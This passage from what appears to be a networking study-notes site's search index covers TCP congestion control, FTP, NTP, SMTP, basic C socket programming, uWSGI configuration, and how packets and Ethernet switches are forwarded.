端到端拥塞控制（网络层没有为运输层提供显式帮助 $$\\Rightarrow$$ 即使网络中存在拥塞，端系统也必须通过对网络行为的观察来推断之）：3 次冗余 ACK 后，认为 TCP 报文的丢失，TCP 会相应地减小其窗口长度。 网络辅助的拥塞控制（网络层构件向发送方提供关于网络层中拥塞状态的显式反馈信息，一个比特）。  TCP 拥塞控制 #  TCP 必须使用端到端拥塞控制而不是使网络辅助的拥塞控制，因为 IP 层不向端系统提供显式的网络拥塞反馈。\nTCP 发送方通过维护一个额外的变量来控制向网络中发送流量的速率，即拥塞窗口（congestion window, cwnd），则发送的数据量需要满足下面的关系：\n$$LastByteSent - LastByteAcked \\le min{cwnd, rwnd}$$\n我们将 “丢包事件” 定义为：出现超时或收到三个冗余 ACK。TCP 使用下面的指导性原则：\n 一个丢失报文即意味着拥塞，应当降低 TCP 发送方的速率； 对先前未确认报文段的确认到达时，应当增加发送方的速率； 带宽探测，TCP 发送方不断提升发送速率直到出现丢包事件。  在 [RFC 5681] 中提出的 TCP 拥塞控制算法（TCP congestion control algorithm）中包括了三个主要部分：慢启动、拥塞避免和快速恢复。其中前两者是强制部分，后者是推荐部分。\n慢启动 #  当一条 TCP 连接开始时，cwnd 的值通常初始置为一个 MSS 的较小值 [RFC 3390]。\n在慢启动状态，cwnd 值以 1 个 MSS 开始，每当收到一个确认就增加一个 MSS。这样一个过程中，每过一个 RTT，发送速率将会翻倍，如下图所示：\n何时结束这种指数级的增长呢？\n 如果存在超时，则 TCP 发送方将 $$ssthresh$$（“慢启动阈值”）设置为 $$cwnd/2$$，将 $$cwnd$$ 设置为 1，并重新开始慢启动过程。 当 $$ssthresh == cwnd$$ 时，结束慢启并且 TCP 转移到拥塞避免模式； 当检测到三个冗余 ACK 时，TCP 执行一个快速重传，并且进入快速恢复模式。  即用如下的 FSM 来描述：\n"},{"id":211,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/ftp/","title":"FTP","section":"5.应用层","content":" 学习网址：\n https://www.cnblogs.com/luoxn28/p/5585458.html https://en.wikipedia.org/wiki/File_Transfer_Protocol   文件传输协议 FTP #  文件传输协议有基于 TCP 的FTP和基于UDP 的简单文件传输协议 TFTP，它们都是文件共享协议中的一大类，即复制整个文件，其特点是：若要存取一个文件，就必须先获得一个本地的文件副本。如果要修改文件，只能对文件的副本进行修改，然后再将修改后的文件传回到原节点。\n基本工作原理 #  FTP 使用客户端-服务器模型，一个 FTP 服务器进程可以为多个客户提供服务。\nFTP 有两大组成部分：\n 一个主进程，负责接受新的请求，其工作步骤如下：  打开众所周知的 21 端口，使客户进行可以连接上； 等待客户进程发送连接请求； 启动从属进程处理客户进程发送的连接请求，从属进程处理完请求后结束，从属进程在运行期间可能根据需要可创建其他一些子进程； 回到等待状态，继续接受其他客户进程发起的请求，主进程与从属进程的处理是并发进行的。   若干个从属进程，负责处理单个请求。  FTP 控制连接在整个会话期间都保持打开，只用来发送连接/传送请求。当客户进程向服务器发送连接请求时，寻找连接服务器进程的熟知端口 21，同时还要告诉服务器进程自己的另一个端口号码，用于建立数据传送连接。接着，服务器进程用自己传送数据的熟知端口 20 与客户进程所提供的端口号码建立数据传送连接，FTP使用了2个不同的端口号，所以数据连接和控制连接不会混乱。\nCommunication and data transfer #  Working Mode #  FTP may run in active or passive mode, which determines how the data connection is established:\n  In active mode, the client starts listening for incoming data connections from the server on port M. It sends the FTP command PORT M to inform the server on which port it is listening. The server then initiates a data channel to the client from its port 20, the FTP server data port.\n  In situations where the client is behind a firewall and unable to accept incoming TCP connections, passive mode may be used.\nIn passive mode, the client uses the control connection to send a PASV command to the server and then receives a server IP address and server port number from the server, which the client then uses to open a data connection from an arbitrary client port to the server IP address and server port number received.\n  在这两种情况下，客户端都使用一个未注册的任意端口 N 连接到服务器的 21 端口，并且使用任意端口连接到服务器 20 端口。\nResponse #  The server responds over the control connection with three-digit status codes in ASCII with an optional text message.\nFor example, 200 (or 200 OK) means that the last command was successful. The numbers represent the code for the response and the optional text represents a human-readable explanation or request (e.g. Need account for storing file).\nData Representation #  While transferring data over the network, four data representations can be used:\n  ASCII mode: Used for text. Data is converted, if needed, from the sending host\u0026rsquo;s character representation to \u0026ldquo;8-bit ASCII\u0026rdquo; before transmission, and (again, if necessary) to the receiving host\u0026rsquo;s character representation.\nAs a consequence, this mode is inappropriate for files that contain data other than plain text.\n  Image mode (commonly called Binary mode): The sending machine sends each file byte by byte, and the recipient stores the bytestream as it receives it. (Image mode support has been recommended for all implementations of FTP).\n  EBCDIC mode（Extended Binary Coded Decimal Interchange Code）: Used for plain text between hosts using the EBCDIC character set.\n  Local mode: Allows two computers with identical setups to send data in a proprietary format without the need to convert it to ASCII.\n  Data transfer can be done in any of three modes:\n Stream mode: Data is sent as a continuous stream, relieving FTP from doing any processing. Rather, all processing is left up to TCP. No End-of-file indicator is needed, unless the data is divided into records. Block mode: FTP breaks the data into several blocks (block header, byte count, and data field) and then passes it on to TCP. Compressed mode: Data is compressed using a simple algorithm (usually run-length encoding).  Authentication #   Login\n FTP login uses normal username and password scheme for granting access.\nThe username is sent to the server using the USER command, and the password is sent using the PASS command. This sequence is unencrypted \u0026ldquo;on the wire\u0026rdquo;, so may be vulnerable to a network sniffing attack. If the information provided by the client is accepted by the server, the server will send a greeting to the client and the session will commence. If the server supports it, users may log in without providing login credentials, but the same server may authorize only limited access for such sessions.\n Anonymous FTP\n A host that provides an FTP service may provide anonymous FTP access. Users typically log into the service with an \u0026lsquo;anonymous\u0026rsquo; (lower-case and case-sensitive in some FTP servers) account when prompted for user name. Although users are commonly asked to send their email address instead of a password, no verification is actually performed on the supplied data. Many FTP hosts whose purpose is to provide software updates will allow anonymous logins.\nFTP 命令和应答 #  命令和应答在客户和服务器的控制连接上以 NVT ASCII 码形式传送。这就要求在每行结尾都要返回 CR、LF 对（也就是每个命令或每个应答）。这些命令都是3或4个字节的大写ASCII字符，其中一些带选项参数。\n从客户向服务器发送的FTP命令超过30种。下图是比较常用的几种命令：\n应答都是 ASCII 码形式的3位数字，并跟有报文选项。其原因是软件系统需要根据数字代码来决定如何应答，而选项串是面向人工处理的。由于客户通常都要输出数字应答和报文串，一个可交互的用户可以通过阅读报文串（而不必记忆所有数字回答代码的含义）来确定应答的含义。\n"},{"id":212,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/ntp/","title":"Ntp","section":"5.应用层","content":" 学习地址：\n https://www.tecmint.com/synchronize-time-with-ntp-in-linux/   NTP #  Protocol #  The Network Time Protocol (NTP) is a protocol used to synchronize computer system clock automatically over a networks. The machine can have the system clock use Coordinated Universal Time (UTC) rather than local time.\nntpdate #  The most common method to sync system time over a network in Linux desktops or servers is by executing the ntpdate command which can set your system time from an NTP time server. In this case, the ntpd daemon must be stopped on the machine where the ntpdate command is issued.\nInstallation:\n$ apt-get install ntpdate Example:\n$ sudo ntpdate 1.ro.pool.ntp.org In order to just query the server and not set the clock and use an unprivileged port to send the packets from, in order to bypass firewalls, issue ntpdate with the below flags:\n$ sudo ntpdate -qu 1.ro.pool.ntp.org Always try to query and sync the time with the closest NTP servers available for your zone. The list of the NTP server pools can be found at the following address: https://www.pool.ntp.org/en/\n此后可以通过 date 指令查看系统时间。\n"},{"id":213,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/smtp/","title":"SMTP","section":"5.应用层","content":" 学习地址：\n https://blog.csdn.net/kerry0071/article/details/28604267 http://coolnull.com/3055.html   SMTP 协议 #  简介 #  SMTP 称为简单邮件传输协议（Simple Mail Transfer Protocal），目标是向用户提供高效、可靠的邮件传输。它的一个重要特点是它能够在传送中接力传送邮件，即邮件可以通过不同网络上的主机接力式传送。\n通常它工作在两种情况下：\n 邮件从客户机传输到服务器； 从某一个服务器传输到另一个服务器。  SMTP 是一个请求/响应协议，它监听 25 号端口，用于接收用户的 Mail 请求，并与远端 Mail 服务器建立 SMTP 连接。\n工作机制 #  发送 SMTP 在接收到用户的邮件请求后，判断此邮件是否为本地邮件，若是直接投送到用户的邮箱，否则向 DNS 查询远端邮件服务器的 MX 记录，并建立与远端接收 SMTP 之间的一个双向传送通道，此后 SMTP 命令由发送 SMTP 发出，由接收 SMTP 接收，而应答则反方向传送。一旦传送通道建立，SMTP 发送者发送 MAIL 命令指明邮件发送者。\n如果 SMTP 接收者可以接收邮件则返回 OK 应答。SMTP 发送者再发出 RCPT 命令确认邮件是否接收到。如果 SMTP 接收者接收，则返回 OK 应答；如果不能接收到，则发出拒绝接收应答（但不中止整个邮件操作），双方将如此反复多次。当接收者收到全部邮件后会接收到特别的序列，入伏哦接收者成功处理了邮件，则返回 OK 应答。\n连接和发送过程 #   建立 TCP 连接。 客户端发送 HELO 命令以标识发件人自己的身份。 客户端发送 MAIL 命令，服务器端以 OK 作为响应，表示准备接收。 客户端发送 RCPT 命令以标识该邮件的计划接收人，可以有多个 RECPT 行，服务器端则表示是否愿意为接收人接收邮件。 客户端发送 DATA 命令，发送邮件，最后以只含有 . 的特殊行结尾。 客户端发送 QUIT 命令，结束此次发送。  Refrence #    STMP Command: http://www.samlogic.net/articles/smtp-commands-reference.htm\n  STMP Reply Code: https://www.greenend.org.uk/rjk/tech/smtpreplies.html\n  "},{"id":214,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/socket/","title":"Socket","section":"5.应用层","content":" 学习网址：\n https://www.geeksforgeeks.org/socket-programming-cc/   Socket Programming #  什么是 socket 编程？\nSocket programming is a way of connecting two nodes on a network to communicate with each other. One socket(node) listens on a particular port at an IP, while other socket reaches out to the other to form a connection. Server forms the listener socket while client reaches out to the server.\n服务端 #  示例代码 #  // Server side C/C++ program to demonstrate Socket programming #include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;netinet/in.h\u0026gt; #include \u0026lt;string.h\u0026gt; #define PORT 8080 int main(int argc, char const *argv[]) { int server_fd, new_socket, valread; struct sockaddr_in address; int opt = 1; int addrlen = sizeof(address); char buffer[1024] = {0}; char *hello = \u0026#34;Hello from server\u0026#34;; // Creating socket file descriptor \tif ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) { perror(\u0026#34;socket failed\u0026#34;); exit(EXIT_FAILURE); } // Forcefully attaching socket to the port 8080 \tif (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, \u0026amp;opt, sizeof(opt))) { perror(\u0026#34;setsockopt\u0026#34;); exit(EXIT_FAILURE); } address.sin_family = AF_INET; address.sin_addr.s_addr = INADDR_ANY; address.sin_port = htons( PORT ); // Forcefully attaching socket to the port 8080 \tif (bind(server_fd, (struct sockaddr *)\u0026amp;address, sizeof(address)) \u0026lt; 0) { perror(\u0026#34;bind failed\u0026#34;); exit(EXIT_FAILURE); } if (listen(server_fd, 3) \u0026lt; 0) { perror(\u0026#34;listen\u0026#34;); exit(EXIT_FAILURE); } if ((new_socket = accept(server_fd, (struct sockaddr *)\u0026amp;address, (socklen_t*)\u0026amp;addrlen))\u0026lt;0) { perror(\u0026#34;accept\u0026#34;); exit(EXIT_FAILURE); } valread = read( new_socket , buffer, 1024); printf(\u0026#34;%s\\n\u0026#34;,buffer ); send(new_socket , hello , strlen(hello) , 0 ); printf(\u0026#34;Hello message sent\\n\u0026#34;); return 0; } 接口的创建 #  int socketfd = socket(domain, type, protocol);   sockfd: socket 描述符，一个整数。\n  domain: 整数，网络层区域。比如：\n AF_INET (IPv4 协议) AF_INET6 (IPv6 协议)    type: 交流方式，传输层协议。\n SOCK_STREAM: TCP（可信，建立连接） SOCK_DGRAM: UDP（不可信，不建立连接）    protocol: 网络层协议的值（IP），该值通常设置为 0，意味我们使用默认的协议。\n  绑定 #  int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); 创建接口之后，上面的 bind 函数会将 sockfd 这个接口绑定到 addr 这个自定义数据结构对象中指定的地址和端口。\n在上面的示例代码中我们使用 INADDR_ANY 来指定 IP 地址，因为我们将服务绑定到了本地的端口。\n监听 #  int listen(int sockfd, int backlog); 该语句令服务器接口处于被动接收消息的模式，也就是说，它开始等待客户端向服务器建立连接。\nbacklog 定义了 socket 在连接时，连接等待队列中可以增长到的最大长度。如果有客户端在最大长度时连接到服务器时，客户端会收到一个 ECONNREFUSED 的错误信息。\n接收 #  int new_socket= accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); 它将 sockfd 等待队列中最靠前的连接请求解压出来，创建一个新的 socket 连接，返回一个新的描述符。\n到此为止，服务器和和客户端已经建立了连接，可以传送数据。\n客户端 #  示例代码 #  // Client side C/C++ program to demonstrate Socket programming #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;netinet/in.h\u0026gt; #include \u0026lt;string.h\u0026gt; #define PORT 8080  int main(int argc, char const *argv[]) { struct sockaddr_in address; int sock = 0, valread; struct sockaddr_in serv_addr; char *hello = \u0026#34;Hello from client\u0026#34;; char buffer[1024] = {0}; if ((sock = socket(AF_INET, SOCK_STREAM, 0)) \u0026lt; 0) { printf(\u0026#34;\\nSocket creation error \\n\u0026#34;); return -1; } memset(\u0026amp;serv_addr, \u0026#39;0\u0026#39;, sizeof(serv_addr)); serv_addr.sin_family = AF_INET; serv_addr.sin_port = htons(PORT); // Convert IPv4 and IPv6 addresses from text to binary form \tif(inet_pton(AF_INET, \u0026#34;127.0.0.1\u0026#34;, \u0026amp;serv_addr.sin_addr)\u0026lt;=0) { printf(\u0026#34;\\nInvalid address/ Address not supported \\n\u0026#34;); return -1; } if (connect(sock, (struct sockaddr *)\u0026amp;serv_addr, sizeof(serv_addr)) \u0026lt; 0) { printf(\u0026#34;\\nConnection Failed \\n\u0026#34;); return -1; } send(sock , hello , strlen(hello) , 0 ); printf(\u0026#34;Hello message sent\\n\u0026#34;); valread = read( sock , buffer, 1024); printf(\u0026#34;%s\\n\u0026#34;,buffer ); return 0; } 接口的创建 #  与服务器端接口的创建过程相同。\n连接的建立 #  int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen); connect 这个系统函数调用，将描述符 sockfd 与由 addr 参数确定的地址和端口连接起来。\n总结 #  TCP-IP 协议下流程大致如下：\n"},{"id":215,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/uwsgi/","title":"Uwsgi","section":"5.应用层","content":" 在搭建 NKCTF 网站的时候学习到的有关 UWSGI 的知识\n WSGI协议 #  几个概念：\n WSGI：Web Server Gateway Interface。WSGI 不是服务器，python 模块，框架，API 或者任何软件，只是一种规范，描述 web server 如何与 web application 通信的规范。  WSGI server 负责从客户端接收请求，将 request 转发给 application，将 application 返回的 response 返回给客户端； WSGI application 接收由 server 转发的 request，处理请求，并将处理结果返回给 server。application 中可以包括多个栈式的中间件(middlewares)，这些中间件需要同时实现 server 与 application，因此可以在 WSGI 服务器与 WSGI 应用之间起调节作用：对服务器来说，中间件扮演应用程序，对应用程序来说，中间件扮演服务器。   **uwsgi：**与 WSGI 一样是一种通信协议，是 uWSGI 服务器的独占协议，用于定义传输信息的类型，每一个 uwsgi packet 前 4byte 为传输信息类型的描述，与WSGI协议是两种东西，据说该协议是 fcgi 协议的10倍快。（快速通用网关接口 → Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议） **uWSGI：**是一个 web 服务器，实现了 WSGI 协议、uwsgi 协议、http 协议等。  WSGI协议的实现 #  以 Django 为例，分析一下 WSGI 协议的具体实现过程：\ndjango WSGI application #  application 的流程包括:\n 加载所有中间件，以及执行框架相关的操作，设置当前线程脚本前缀，发送请求开始信号； 处理请求，调用 get_response() 方法处理当前请求，该方法的的主要逻辑是通过 urlconf 找到对应的 view 和 callback，按顺序执行各种 middleware 和 callback。 调用由 server 传入的 start_response() 方法将响应 header 与 status 返回给 server。 返回响应正文  django WSGI Server #  通过 python manage.py runserver 运行 django 项目，在启动时都会调用下面的 run 方法，创建一个 WSGIServer 的实例，之后再调用其 serve_forever() 方法启动服务。\ndef run(addr, port, wsgi_handler, ipv6=False, threading=False): server_address = (addr, port) if threading: httpd_cls = type(str(\u0026#39;WSGIServer\u0026#39;), (socketserver.ThreadingMixIn, WSGIServer), {}) else: httpd_cls = WSGIServer # 这里的wsgi_handler就是WSGIApplication httpd = httpd_cls(server_address, WSGIRequestHandler, ipv6=ipv6) if threading: httpd.daemon_threads = True httpd.set_app(wsgi_handler) httpd.serve_forever() 下面表示 WSGI server 服务器处理流程中关键的类和方法：\nUWSGI #  uwsgi 命令行 #  强制停止后台的所有 uwsgi 进程：\n$ sudo pkill-f uwsgi -9 uwsgi 配置 #   见：https://uwsgi-docs.readthedocs.io/en/latest/Configuration.html\n uWSGI configuration files can include “magic” variables, prefixed with a percent sign. Currently the following magic variables (you can access them in Python via uwsgi.magic_table) are defined:\n   %v the vassals directory (pwd)     %V the uWSGI version   %h the hostname   %o the original config filename, as specified on the command line   %O same as %o but refer to the first non-template config file (version 1.9.18)   %p the absolute path of the configuration file   %P same as %p but refer to the first non-template config file (version 1.9.18)   %s the filename of the configuration file   %S same as %s but refer to the first non-template config file (version 1.9.18)   %d the absolute path of the directory containing the configuration file   %D same as %d but refer to the first non-template config file (version 1.9.18)   %e the extension of the configuration file   %E same as %e but refer to the first non-template config file (version 1.9.18)   %n the filename without extension   %N same as %n but refer to the first non-template config file (version 1.9.18)   %c the name of the directory containing the config file (version 1.3+)   %C same as %c but refer to the first non-template config file (version 1.9.18)   %t unix time (in seconds, gathered at instance startup) (version 1.9.20-dev+)   %T unix time (in microseconds, gathered at instance startup) (version 1.9.20-dev+)   %x the current section identifier, eg. config.ini:section (version 1.9-dev+)   %X same as %x but refer to the first non-template config file (version 1.9.18)   %i inode number of the file (version 2.0.1)   %I same as %i but refer to the first non-template config file   %0..%9 a specific component of the full path of the directory containing the config file (version 1.3+)   %[ ANSI escape “\\033” (useful for printing colors)   %k detected cpu cores (version 1.9.20-dev+)   %u uid of the user running the process (version 2.0)   %U username (if available, otherwise fallback to uid) of the user running the process (version 2.0)   %g gid of the user running the process (version 2.0)   %G group name (if available, otherwise fallback to gid) of the user running the process (version 2.0)   %j HEX representation of the djb33x hash of the full config path   %J same as %j but refer to the first non-template config file    "},{"id":216,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/1.%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93/","title":"1.网络传输","section":"网络基本功","content":" 学习网址：https://www.kancloud.cn/wizardforcel/network-basic/135483\n 网络传输 #  传输流程 #  下图显示了一个网络服务器向客户端传送数据的完整过程：\n  传送的数据是网络服务器的HTML页面。\n  应用层协议 HTTP 报文头添加到 HTML 数据之前生成报文。报文头信息包括：服务器所使用的HTTP版本，以及表明它包含发给网络客户端信息的状态编码。\n  HTTP 应用层协议将 HTML 格式的网页数据发送给传输层。TCP 传输层用于管理网络服务器和客户端之间的 TCP 会话。\n  IP 信息添加到 TCP 信息之前。IP 指定适当的源和目的 IP 地址。这些信息就构成了 IP 报文。\n  以太网协议添加到IP报文的两端之后，就形成了数据链路帧。上述帧发送至通向网络客户端的路径上的最近一个路由器。路由器移除以太网信息，观察IP报文，判定最佳路径，将报文插入一个新的帧，并发送至目标路径上下一个相邻路由器。每一个路由器在转发之前都移除并添加新的数据链路层信息。\n  数据通过互联网络传输，互联网络包含媒介和中间设备。\n  客户端接收到包含数据的数据链路帧，处理各层协议头，之后以添加时相反的顺序移除协议头。首先处理并移除以太网信息 → 之后是 IP 协议信息 → 接下来 TCP 信息 → 最后是 HTTP 信息。\n  之后，将网页信息传递给客户端网页浏览器软件。\n  传输概念 #  数据封装 #  消息要在网络中传输，必须对它进行编码，以特定的格式进行封装，同时需要适当地封装以足够的控制和地址信息，以使它能够从发送方移动到接收方。\n消息大小 #  理论上，视频或邮件信息是能够以大块非中断型流从网络源地址传送到目的地址，但这也意味着同一时刻同一网络其他设备就无法收发消息。这种大型数据流会造成显著延时。并且，如果传输过程中连接断开，整个数据流都会丢失需要全部重传。\n因此，更好的方法是将数据流分割（segmentation）为较小的，便于管理的片段，能够带来两点好处：\n 对于发送端来说：发送较小片段，网络上同时可有多个会话交错进行。这种在网络上将不同会话片段交错进行的过程称为多路传输（multiplexing）。 对于接收端来说：“分割” 可以提高网络通讯的可靠性。各消息片段从源地址到目的地址无需经过相同路径，如果一条路径被堵塞或断开，其余消息可从替换路径到达目的地址。如果部分消息到不了目的地址，那只需重传丢失部分。  PostScript: 需要通过对片段打上标签的方式来保证顺序以及在接收时重组：\n协议数据单元 #  协议数据单元（Protocol Data Unit, PDU）：数据片段在各层网络结构中采用的形式。\n按照 TCP/IP 协议的命名规范，PDU 在不同网络层级结构中的名称如下：\n   所属网络层级 名称     应用层 PDU 数据 Data   传输层 PDU 分段 segment   网络层 PDU 数据报 Datagram   数据链路层 PDU 帧 Frame   物理链路层 PDU 比特 Bits    他们加入的内容如下图所示：\n访问本地资源 #  访问本地网络资源需要两种类型的地址：网络层地址和数据链路层地址。网络层和数据链路层负责将数据从发送设备传输至接收设备。两层协议都有源和目的地址，但两种地址的目的不同。\n我们以以下的图举例：\n网络地址 #  网络层地址，即 IP 地址 → 包含两个部分：网络前缀和主机。路由器使用网络前缀部分将报文转发给适当的网络。最后一个路由器使用主机部分将报文发送给目标设备。同一本地网络中，网络前缀部分是相同的，只有主机设备地址部分不同。\n对于以上的例子：\n 源 IP 地址：发送设备，上图中即 192.168.1.110 目的 IP 地址：接受设备，上图中即 192.168.1.9  数据链路地址 #  数据链路地址的目的是在同一网络中将数据链路帧从一个网络接口发送至另一个网络接口。以太网 LAN (Local Area Network) 和无线网 LAN 是两种不同物理介质的网络示例，分别有自己的数据链路协议。\n当 IP 报文的发送方和接收方位于同一网络，数据链路帧直接发送到接收设备。以太网上数据链路地址就是以太网 MAC 地址。MAC 地址是物理植入网卡的 48 比特地址。\n对于以上的例子：\n 源 MAC 地址：发送 IP 报文的 PC1 以太网卡 MAC 地址，AA-AA-AA-AA-AA-AA。 目的 MAC 地址：当发送设备与接收设备位于同一网络，即为接收设备的数据链路地址。本例中，FTP MAC 地址：CC-CC-CC-CC-CC-CC。  MAC 地址与 IP 地址 #  为了访问一个本地资源，发送方必须知道接收方的物理和逻辑地址。\n发送方主机能够以多种方式学习到接收方的IP地址：比如域名系统（Domain Name System, DNS），或通过应用手动输入，如用户指定FTP地址。\n以太网 MAC 地址是怎么识别的呢？发送方主机使用**地址解析协议（Address Resolution Protocol, ARP）**以检测本地网络的所有 MAC 地址。如下图所示，发送主机在整个 LAN 发送 ARP 请求消息，这是一条广播消息。ARP 请求包含目标设备的 IP 地址，LAN上的每一个设备都会检查该ARP请求，看看是否包含它自身的 IP 地址。只有符合该 IP 地址的设备才会发送 ARP 响应。ARP 响应包含 ARP 请求中 IP 地址相对应的 MAC 地址。\n访问远程资源 #  默认网关 #  默认网关：是指位于发送主机同一网络上的路由器的接口 IP 地址。\n当主机发送消息到远端网络，必须使用路由器。默认网关就是有一点很重要：本地网络上的所有主机都能够配置自己的默认网关地址。如果该主机的 TCP/IP 设置中没有配置默认网关地址，或指定了错误的默认网关地址，则远端网络消息无法被送达。\n如下图所示，LAN 上的主机 PC 1 使用 IP 地址为 192.168.1.1 的 R1 作为默认网关，如果 PDU 的目的地址位于另一个网络，则主机将 PDU 发送至路由器上的默认网关：\n网络地址 #  当报文的发送方与接收方位于不同网络，源和目的IP地址将会代表不同网络上的主机。\n对于以上的例子：\n  源IP地址：发送设备即客户端主机PC 1的IP地址：192.168.1.110。\n  目的IP地址：接收设备即网络服务器的IP地址：172.16.1.99。\n  数据链路地址 #  当报文的发送方与接收方位于不同网络，以太网数据链路帧无法直接被发送到目的主机。以太网帧必须先发送给路由器或默认网关。本例中，默认网关是 R1，R1 的接口 IP 地址与 PC 1 属于同一网络，因此 PC 1 能够直接达到路由器。\n对于以上的例子：\n  源MAC地址：发送设备即PC 1的MAC地址，PC1的以太网接口MAC地址为：AA-AA-AA-AA-AA-AA。\n  目的MAC地址：当报文的发送方与接收方位于不同网络，这一值为路由器或默认网关的以太网MAC地址。本例中，即R1的以太网接口MAC地址，即：11-11-11-11-11-11。\n  IP 报文封装成的以太网帧先被传输至 R1，R1 再转发给目的地址即网络服务器。R1 可以转发给另一个路由器，如果目的服务器所在网路连接至 R1，则直接发送给服务器。\n发送设备如何确定路由器的 MAC 地址？每一个设备通过自己的 TCP/IP 设置中的默认网关地址得知路由器的 IP 地址。之后，它通过 ARP 来得知默认网关的 MAC 地址，该 MAC 地址随后添加到帧中。\n"},{"id":217,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/2.%E4%BA%A4%E6%8D%A2%E6%9C%BA/","title":"2.交换机","section":"网络基本功","content":" 学习网址：https://www.kancloud.cn/wizardforcel/network-basic/135484\n 交换机 #  帧转发技术\n交换概念 #  交换指基于以下两条准则做出决定的设备：\n 进入（ingress）端口 目的地址  交换机通过以太网帧中的源 MAC 地址与目的 MAC 地址，从源设备接收到帧并快速发往目的地址。\n术语 ingress 用于描述帧通过特定端口进入设备，egress 用于描述帧通过特定端口离开设备。\nLAN（Local Area Network，局域网）交换机维护一张表，通过这张表决定如何转发数据流。LAN 交换机唯一智能部分是利用这张表基于消息的进入端口和目的地址来转发。\n一个 LAN 交换机中只有一张定义了地址和端口的主交换表；因此，无论进入端口如何，同一目的地址的消息永远从同一出口离开。\nMAC 地址表动态更新 #  一个交换机要知道使用哪一个端口进行传送帧，首先必须知道各个端口有哪些设备。\n交换机使用 MAC 表的方式完成，它建立起一张 MAC 地址表，内容可寻址寄存表（CAM）。交换机将连接到它的端口的设备的 MAC 地址记录到 MAC 表中，然后利用表中信息将帧发送至输出端口设备，该端口已指定给该设备。\n交换机操作模式的一句简单的话是：交换机学习“源地址”，基于“目的地址”转发。以下步骤描述了更新 MAC 地址表的方法：\n 交换机在 port1 接收到来自 PC1 的帧。 交换机检查源 MAC 地址并与 MAC 地址表相比较：  如果地址不在表中，则将交换机在 MAC 地址表中将 PC 1 的源 MAC 地址关联到进入端口（port 1） 如果地址已经存在该表中，则交换机重置老化计时器。通常一个表项会保持 5 分钟。   交换机记录源地址信息后，检查目的地址：如果目的 MAC 地址不在表项中或如果它是一个广播 MAC 地址，则交换机把该帧泛洪（flood）至除了进入端口以外的所有端口。（如果在表项中则可以直接正常通信） 目标设备（PC 3）返回目的地址为 PC 1 的单播帧。 交换机地址表中输入 PC 3 的源 MAC 地址以及进入的端口号。 交换机现在可以在源 PC 1 和目标设备 PC 3 之间传送帧而无需泛洪。  交换机的转发方式 #  存储转发交换 Store-and-Forward #  运行在存储转发模式下的交换机在发送信息前要把整帧数据读入内存并检查其正确性。\n尽管采用这种方式比采用直通方式更花时间，但采用这种方式可以存储转发数据，从而保证其准确性。由于运行在存储转发模式下的交换机不传播错误数据，因而更适合大型局域网。\n存储转发模式有两大主要特征区别于直通转发模式：\n 差错控制：在进入端口接收完整一帧之后，交换机将数据报最后一个字段的帧校验序列（frame check sequence, FCS）与自己的 FCS 进行比较。FCS 校验过程用以帮助确保帧没有物理及数据链路错误，如果该帧校验正确，则转发。否则丢弃。 自动缓存：存储转发交换机通过进入端口缓存，支持不同速率以太网的混合连接。例如，接收到一个以 1Gb/s 速率发出的帧，转发至百兆以太网端口，就需要使用存储转发方式。当进入与输出端口速率不匹配时，交换机将整帧内容放入缓存中，计算 FCS 校验，转发至输出缓存之后将帧发出。  Cisco 的主要交换方式是存储转发交换。\n直通交换 Cut-Through #  采用直通模式的交换机会在接收完整个数据包之前就读取帧头，并决定把数据发往哪个端口。直通交换的一个优势是比存储转发技术更为快速，不用缓存数据也不用检查数据的完整性。\n这种交换方式有两大特点：\n  快速帧转发：一旦交换机在 MAC 地址表中查找到目的 MAC 地址，就立刻做出转发决定。而无需等待帧的剩余部分进入端口再做出转发决定。\n  无效帧处理：对于大多数无效帧，直通方式交换机并不将其丢弃。\n错误帧被转发至其他网段。如果网络中出现高差错率（无效帧），直通交换可能会对带宽造成不利影响，损坏以及无效帧会造成带宽拥塞。在拥塞情况下，这种交换机必须像存储转发交换机那样缓存。\n  无碎片转发 Fragment-Free #  无碎片转发是直通方式的一种改进模式。交换机转发之前检查帧是否大于 64 字节（小于则丢弃），以保证没有碎片帧。无碎片方式比直通方式拥有更好的差错检测，而实际上没有增加延时。\n它比较适合于高性能计算应用，即进程到进程延时小于 10ms 的应用场景。\n冲突域广播域 #   学习地址：\n 